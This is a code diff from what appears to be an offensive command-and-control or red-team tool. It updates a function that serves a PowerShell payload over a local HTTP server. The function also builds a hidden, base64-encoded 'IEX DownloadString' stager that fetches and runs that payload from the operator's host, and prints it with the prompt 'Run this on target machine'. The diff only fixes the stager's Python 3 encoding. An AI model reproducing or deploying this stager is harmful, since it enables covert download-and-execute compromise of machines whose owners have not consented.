@@ -45,7 +45,9 @@ def printListener(printit=True, returnit=False):
     randoStagerDLPort = FUNCTIONS().randomUnusedPort()
 
     FUNCTIONS().DoServe(returnIP(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
-    stagerexec = 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + returnIP() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
+    #stagerexec = 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + returnIP() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
+    #Fixing encoding
+    stagerexec = 'powershell -w hidden -noni -enc ' + base64.b64encode(("IEX (New-Object Net.Webclient).DownloadString('http://" + returnIP() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le')).decode()
 
     if printit:
         print(t.bold_green + '[!] Run this on target machine...' + t.normal + '\n\n' + stagerexec + '\n')
